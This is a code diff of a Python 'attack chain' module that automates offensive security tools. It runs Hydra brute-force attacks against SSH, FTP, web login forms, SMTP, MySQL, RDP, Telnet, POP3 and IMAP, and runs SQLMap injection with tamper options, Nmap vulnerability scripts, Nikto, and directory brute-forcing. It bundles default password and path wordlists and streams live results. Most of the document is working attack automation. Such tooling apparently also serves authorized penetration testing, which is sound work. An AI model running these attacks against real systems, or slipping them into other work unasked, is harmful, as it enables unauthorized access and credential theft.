@@ -1,8 +1,8 @@
 #!/usr/bin/env python3
 """
 Attack Chain — Individual attack execution functions.
-Each function wraps a security tool (Hydra, SQLMap, Nmap scripts)
-and returns structured results.
+Each function wraps a security tool (Hydra, SQLMap, Nmap scripts, Nikto, Dirb)
+and returns structured results with live output streaming.
 """
 
 import os
@@ -10,9 +10,11 @@ import sys
 import subprocess
 import json
 import re
+import time
+import threading
 
 sys.path.insert(0, os.path.join(os.path.dirname(__file__), '..', 'recon'))
-from utility import status_msg, success_msg, error_msg, warning_msg, info_msg
+from utility import status_msg, success_msg, error_msg, warning_msg, info_msg, console
 
 
 # ─── WORDLIST HELPERS ──────────────────────────────────────
@@ -30,6 +32,11 @@ def find_wordlist(wl_type='passwords'):
         'usernames': [
             '/usr/share/seclists/Usernames/top-usernames-shortlist.txt',
             '/usr/share/wordlists/metasploit/unix_users.txt',
+        ],
+        'dirs': [
+            '/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt',
+            '/usr/share/dirb/wordlists/common.txt',
+            '/usr/share/seclists/Discovery/Web-Content/common.txt',
         ]
     }
 
@@ -42,6 +49,10 @@ def find_wordlist(wl_type='passwords'):
         minimal = ['admin', 'password', '123456', 'root', 'toor', 'admin123',
                     'letmein', 'welcome', 'monkey', 'dragon', 'master', 'qwerty',
                     'login', 'password1', 'abc123', 'starwars', 'trustno1', '1234567890']
+    elif wl_type == 'dirs':
+        minimal = ['admin', 'login', 'wp-admin', 'dashboard', 'api', 'config',
+                    'backup', 'test', 'uploads', 'images', 'css', 'js', '.git',
+                    '.env', 'phpmyadmin', 'cpanel', 'webmail', 'server-status']
     else:
         minimal = ['admin', 'root', 'user', 'test', 'guest', 'administrator',
                     'ftp', 'www', 'web', 'info', 'mysql', 'oracle', 'postgres']
@@ -52,36 +63,81 @@ def find_wordlist(wl_type='passwords'):
     return fallback_path
 
 
-def run_tool(cmd, timeout=300, output_file=None):
-    """Execute a security tool command and capture output."""
+def run_tool_live(cmd, timeout=300, output_file=None, label="Attack"):
+    """Execute a security tool with LIVE output streaming.
+    Shows real-time output so the user knows the tool is running.
+    """
+    full_output = []
+    start_time = time.time()
+
     try:
-        result = subprocess.run(
+        process = subprocess.Popen(
             cmd, shell=True,
-            capture_output=True, text=True,
-            timeout=timeout
+            stdout=subprocess.PIPE,
+            stderr=subprocess.STDOUT,
+            text=True,
+            bufsize=1
         )
 
-        output = result.stdout + result.stderr
+        # Read output line by line in real-time
+        lines_shown = 0
+        while True:
+            line = process.stdout.readline()
+            if not line and process.poll() is not None:
+                break
+            if line:
+                stripped = line.strip()
+                full_output.append(stripped)
+                # Show important lines to the user
+                if stripped and not stripped.startswith('[!]'):
+                    elapsed = int(time.time() - start_time)
+                    # Show every line but keep it clean
+                    if lines_shown < 200:  # Cap visible output
+                        console.print(f"  [dim]  [{elapsed}s] {stripped[:120]}[/dim]")
+                        lines_shown += 1
+
+            # Check timeout
+            if time.time() - start_time > timeout:
+                process.kill()
+                warning_msg(f"{label} timed out after {timeout}s")
+                break
+
+        process.wait(timeout=10)
+        return_code = process.returncode
+
+        output = '\n'.join(full_output)
+        elapsed = int(time.time() - start_time)
+        info_msg(f"{label} completed in {elapsed}s ({len(full_output)} output lines)")
 
         if output_file:
             with open(output_file, 'w') as f:
                 f.write(f"Command: {cmd}\n")
-                f.write(f"Return Code: {result.returncode}\n")
+                f.write(f"Return Code: {return_code}\n")
+                f.write(f"Duration: {elapsed}s\n")
                 f.write("=" * 60 + "\n")
                 f.write(output)
 
         return {
-            'success': result.returncode == 0,
+            'success': return_code == 0,
             'output': output,
-            'return_code': result.returncode
+            'return_code': return_code,
+            'duration': elapsed
         }
 
-    except subprocess.TimeoutExpired:
-        return {'success': False, 'message': f'Timed out after {timeout}s', 'output': ''}
     except FileNotFoundError:
         return {'success': False, 'message': 'Tool not found. Is it installed?', 'output': ''}
     except Exception as e:
         return {'success': False, 'message': str(e), 'output': ''}
+
+
+def _parse_hydra_creds(output):
+    """Parse Hydra output for discovered credentials."""
+    creds = []
+    if output:
+        for line in output.split('\n'):
+            if 'host:' in line.lower() and ('login:' in line.lower() or 'password:' in line.lower()):
+                creds.append(line.strip())
+    return creds
 
 
 # ─── HYDRA ATTACKS ──────────────────────────────────────────
@@ -102,15 +158,9 @@ def hydra_ssh(opportunity, output_dir):
            f'-s {port} -t 4 -f -vV '
            f'{ip} ssh')
 
-    result = run_tool(cmd, timeout=300, output_file=output_file)
+    result = run_tool_live(cmd, timeout=300, output_file=output_file, label="Hydra SSH")
 
-    # Parse Hydra output for successful creds
-    creds = []
-    if result.get('output'):
-        for line in result['output'].split('\n'):
-            if 'host:' in line.lower() and ('login:' in line.lower() or 'password:' in line.lower()):
-                creds.append(line.strip())
-
+    creds = _parse_hydra_creds(result.get('output', ''))
     result['credentials_found'] = creds
     result['message'] = f"Found {len(creds)} credential(s)" if creds else "No credentials found"
     result['output_file'] = output_file
@@ -131,7 +181,8 @@ def hydra_ftp(opportunity, output_dir):
 
     # First try anonymous login
     anon_cmd = f'hydra -l anonymous -p anonymous -s {port} -f {ip} ftp'
-    anon_result = run_tool(anon_cmd, timeout=30)
+    info_msg("Trying anonymous FTP login first...")
+    anon_result = run_tool_live(anon_cmd, timeout=30, label="FTP Anon Check")
 
     if anon_result.get('output') and 'host:' in anon_result['output'].lower():
         success_msg("Anonymous FTP login successful!")
@@ -146,18 +197,14 @@ def hydra_ftp(opportunity, output_dir):
         }
 
     # Full brute force
+    info_msg("Anonymous failed, starting brute force...")
     cmd = (f'hydra -L {user_list} -P {pass_list} '
            f'-s {port} -t 4 -f -vV '
            f'{ip} ftp')
 
-    result = run_tool(cmd, timeout=300, output_file=output_file)
+    result = run_tool_live(cmd, timeout=300, output_file=output_file, label="Hydra FTP")
 
-    creds = []
-    if result.get('output'):
-        for line in result['output'].split('\n'):
-            if 'host:' in line.lower() and 'login:' in line.lower():
-                creds.append(line.strip())
-
+    creds = _parse_hydra_creds(result.get('output', ''))
     result['credentials_found'] = creds
     result['message'] = f"Found {len(creds)} credential(s)" if creds else "No credentials found"
     result['output_file'] = output_file
@@ -176,32 +223,174 @@ def hydra_http_form(opportunity, output_dir):
     info_msg(f"Launching Hydra HTTP Form attack on {url}")
     warning_msg("HTTP form attacks require manual tuning for best results")
 
-    # Try common form field names
     from urllib.parse import urlparse
     parsed = urlparse(url)
     host = parsed.hostname
     port = parsed.port or (443 if parsed.scheme == 'https' else 80)
     path = parsed.path or '/login'
 
-    # Generic form format (may need tuning per target)
     form_params = f"{path}:username=^USER^&password=^PASS^:F=incorrect"
-
     protocol = 'https-post-form' if parsed.scheme == 'https' else 'http-post-form'
 
     cmd = (f'hydra -L {user_list} -P {pass_list} '
            f'-s {port} -t 4 -f -vV '
            f'{host} {protocol} "{form_params}"')
 
-    result = run_tool(cmd, timeout=300, output_file=output_file)
+    result = run_tool_live(cmd, timeout=300, output_file=output_file, label="Hydra HTTP")
 
-    creds = []
-    if result.get('output'):
-        for line in result['output'].split('\n'):
-            if 'host:' in line.lower() and 'login:' in line.lower():
-                creds.append(line.strip())
-
+    creds = _parse_hydra_creds(result.get('output', ''))
     result['credentials_found'] = creds
     result['message'] = f"Found {len(creds)} credential(s)" if creds else "No credentials found (form params may need tuning)"
+    result['output_file'] = output_file
+
+    return result
+
+
+def hydra_smtp(opportunity, output_dir):
+    """Brute force SMTP using Hydra."""
+    ip = opportunity.get('ip', '')
+    port = opportunity.get('port', '25')
+
+    user_list = find_wordlist('usernames')
+    pass_list = find_wordlist('passwords')
+    output_file = os.path.join(output_dir, f'hydra_smtp_{ip}_{port}.txt')
+
+    info_msg(f"Launching Hydra SMTP attack on {ip}:{port}")
+
+    cmd = (f'hydra -L {user_list} -P {pass_list} '
+           f'-s {port} -t 4 -f -vV '
+           f'{ip} smtp')
+
+    result = run_tool_live(cmd, timeout=300, output_file=output_file, label="Hydra SMTP")
+
+    creds = _parse_hydra_creds(result.get('output', ''))
+    result['credentials_found'] = creds
+    result['message'] = f"Found {len(creds)} SMTP credential(s)" if creds else "No credentials found"
+    result['output_file'] = output_file
+
+    return result
+
+
+def hydra_mysql(opportunity, output_dir):
+    """Brute force MySQL using Hydra."""
+    ip = opportunity.get('ip', '')
+    port = opportunity.get('port', '3306')
+
+    user_list = find_wordlist('usernames')
+    pass_list = find_wordlist('passwords')
+    output_file = os.path.join(output_dir, f'hydra_mysql_{ip}_{port}.txt')
+
+    info_msg(f"Launching Hydra MySQL attack on {ip}:{port}")
+
+    cmd = (f'hydra -L {user_list} -P {pass_list} '
+           f'-s {port} -t 4 -f -vV '
+           f'{ip} mysql')
+
+    result = run_tool_live(cmd, timeout=300, output_file=output_file, label="Hydra MySQL")
+
+    creds = _parse_hydra_creds(result.get('output', ''))
+    result['credentials_found'] = creds
+    result['message'] = f"Found {len(creds)} MySQL credential(s)" if creds else "No credentials found"
+    result['output_file'] = output_file
+
+    return result
+
+
+def hydra_rdp(opportunity, output_dir):
+    """Brute force RDP using Hydra."""
+    ip = opportunity.get('ip', '')
+    port = opportunity.get('port', '3389')
+
+    user_list = find_wordlist('usernames')
+    pass_list = find_wordlist('passwords')
+    output_file = os.path.join(output_dir, f'hydra_rdp_{ip}_{port}.txt')
+
+    info_msg(f"Launching Hydra RDP attack on {ip}:{port}")
+
+    cmd = (f'hydra -L {user_list} -P {pass_list} '
+           f'-s {port} -t 4 -f -vV '
+           f'{ip} rdp')
+
+    result = run_tool_live(cmd, timeout=300, output_file=output_file, label="Hydra RDP")
+
+    creds = _parse_hydra_creds(result.get('output', ''))
+    result['credentials_found'] = creds
+    result['message'] = f"Found {len(creds)} RDP credential(s)" if creds else "No credentials found"
+    result['output_file'] = output_file
+
+    return result
+
+
+def hydra_telnet(opportunity, output_dir):
+    """Brute force Telnet using Hydra."""
+    ip = opportunity.get('ip', '')
+    port = opportunity.get('port', '23')
+
+    user_list = find_wordlist('usernames')
+    pass_list = find_wordlist('passwords')
+    output_file = os.path.join(output_dir, f'hydra_telnet_{ip}_{port}.txt')
+
+    info_msg(f"Launching Hydra Telnet attack on {ip}:{port}")
+
+    cmd = (f'hydra -L {user_list} -P {pass_list} '
+           f'-s {port} -t 4 -f -vV '
+           f'{ip} telnet')
+
+    result = run_tool_live(cmd, timeout=300, output_file=output_file, label="Hydra Telnet")
+
+    creds = _parse_hydra_creds(result.get('output', ''))
+    result['credentials_found'] = creds
+    result['message'] = f"Found {len(creds)} Telnet credential(s)" if creds else "No credentials found"
+    result['output_file'] = output_file
+
+    return result
+
+
+def hydra_pop3(opportunity, output_dir):
+    """Brute force POP3 using Hydra."""
+    ip = opportunity.get('ip', '')
+    port = opportunity.get('port', '110')
+
+    user_list = find_wordlist('usernames')
+    pass_list = find_wordlist('passwords')
+    output_file = os.path.join(output_dir, f'hydra_pop3_{ip}_{port}.txt')
+
+    info_msg(f"Launching Hydra POP3 attack on {ip}:{port}")
+
+    cmd = (f'hydra -L {user_list} -P {pass_list} '
+           f'-s {port} -t 4 -f -vV '
+           f'{ip} pop3')
+
+    result = run_tool_live(cmd, timeout=300, output_file=output_file, label="Hydra POP3")
+
+    creds = _parse_hydra_creds(result.get('output', ''))
+    result['credentials_found'] = creds
+    result['message'] = f"Found {len(creds)} POP3 credential(s)" if creds else "No credentials found"
+    result['output_file'] = output_file
+
+    return result
+
+
+def hydra_imap(opportunity, output_dir):
+    """Brute force IMAP using Hydra."""
+    ip = opportunity.get('ip', '')
+    port = opportunity.get('port', '143')
+
+    user_list = find_wordlist('usernames')
+    pass_list = find_wordlist('passwords')
+    output_file = os.path.join(output_dir, f'hydra_imap_{ip}_{port}.txt')
+
+    info_msg(f"Launching Hydra IMAP attack on {ip}:{port}")
+
+    cmd = (f'hydra -L {user_list} -P {pass_list} '
+           f'-s {port} -t 4 -f -vV '
+           f'{ip} imap')
+
+    result = run_tool_live(cmd, timeout=300, output_file=output_file, label="Hydra IMAP")
+
+    creds = _parse_hydra_creds(result.get('output', ''))
+    result['credentials_found'] = creds
+    result['message'] = f"Found {len(creds)} IMAP credential(s)" if creds else "No credentials found"
     result['output_file'] = output_file
 
     return result
@@ -227,7 +416,7 @@ def sqlmap_url(opportunity, output_dir):
            f'--tamper=between '
            f'2>&1')
 
-    result = run_tool(cmd, timeout=300, output_file=output_file)
+    result = run_tool_live(cmd, timeout=300, output_file=output_file, label="SQLMap GET")
 
     # Check for SQLi confirmation
     injectable = False
@@ -269,7 +458,7 @@ def sqlmap_form(opportunity, output_dir):
            f'--random-agent '
            f'2>&1')
 
-    result = run_tool(cmd, timeout=300, output_file=output_file)
+    result = run_tool_live(cmd, timeout=300, output_file=output_file, label="SQLMap POST")
 
     injectable = False
     if result.get('output'):
@@ -299,7 +488,7 @@ def nmap_vulnscan(opportunity, output_dir):
            f'-oN {output_file} '
            f'{ip}')
 
-    result = run_tool(cmd, timeout=600, output_file=output_file)
+    result = run_tool_live(cmd, timeout=600, output_file=output_file, label="Nmap Vuln Scan")
 
     # Parse for CVEs
     cves = []
@@ -310,6 +499,93 @@ def nmap_vulnscan(opportunity, output_dir):
     result['cves_found'] = cves
     result['message'] = f"Found {len(cves)} CVE(s)" if cves else "No CVEs identified"
     result['success'] = len(cves) > 0
+    result['output_file'] = output_file
+
+    return result
+
+
+# ─── WEB SCANNING ───────────────────────────────────────────
+
+def nikto_scan(opportunity, output_dir):
+    """Run Nikto web vulnerability scanner against a target."""
+    url = opportunity.get('url', '')
+    from urllib.parse import urlparse
+    parsed = urlparse(url)
+    host = parsed.hostname
+    port = parsed.port or (443 if parsed.scheme == 'https' else 80)
+
+    output_file = os.path.join(output_dir, f'nikto_{host}_{port}.txt')
+
+    info_msg(f"Launching Nikto scan on {url}")
+
+    ssl_flag = '-ssl' if parsed.scheme == 'https' else ''
+    cmd = (f'nikto -h {host} -p {port} {ssl_flag} '
+           f'-output {output_file} '
+           f'-Format txt '
+           f'-Tuning x6 '
+           f'-maxtime 300 '
+           f'2>&1')
+
+    result = run_tool_live(cmd, timeout=360, output_file=output_file, label="Nikto")
+
+    # Count findings
+    findings = 0
+    if result.get('output'):
+        for line in result['output'].split('\n'):
+            if line.strip().startswith('+ ') and 'OSVDB' in line:
+                findings += 1
+
+    result['findings_count'] = findings
+    result['message'] = f"Found {findings} potential issue(s)" if findings else "No web vulnerabilities found"
+    result['success'] = findings > 0
+    result['output_file'] = output_file
+
+    return result
+
+
+def dirb_scan(opportunity, output_dir):
+    """Run directory brute force using Dirb or Gobuster."""
+    url = opportunity.get('url', '')
+    from urllib.parse import urlparse
+    parsed = urlparse(url)
+    host = parsed.hostname
+    port = parsed.port or (443 if parsed.scheme == 'https' else 80)
+
+    output_file = os.path.join(output_dir, f'dirb_{host}_{port}.txt')
+    wordlist = find_wordlist('dirs')
+
+    info_msg(f"Launching directory brute force on {url}")
+
+    # Try gobuster first, fall back to dirb
+    gobuster_check = subprocess.run('which gobuster', shell=True, capture_output=True)
+    if gobuster_check.returncode == 0:
+        cmd = (f'gobuster dir -u {url} -w {wordlist} '
+               f'-o {output_file} '
+               f'-t 10 --no-error '
+               f'-k '  # Skip TLS verification
+               f'2>&1')
+        label = "Gobuster"
+    else:
+        cmd = (f'dirb {url} {wordlist} '
+               f'-o {output_file} '
+               f'-r -S '  # Don't recurse, silent
+               f'2>&1')
+        label = "Dirb"
+
+    result = run_tool_live(cmd, timeout=300, output_file=output_file, label=label)
+
+    # Count discovered paths
+    dirs_found = 0
+    if result.get('output'):
+        for line in result['output'].split('\n'):
+            # Gobuster format: /path (Status: 200)
+            # Dirb format: + http://... (CODE:200)
+            if 'Status: 2' in line or 'Status: 3' in line or 'CODE:200' in line or 'CODE:301' in line:
+                dirs_found += 1
+
+    result['dirs_found'] = dirs_found
+    result['message'] = f"Found {dirs_found} accessible path(s)" if dirs_found else "No hidden directories found"
+    result['success'] = dirs_found > 0
     result['output_file'] = output_file
 
     return result
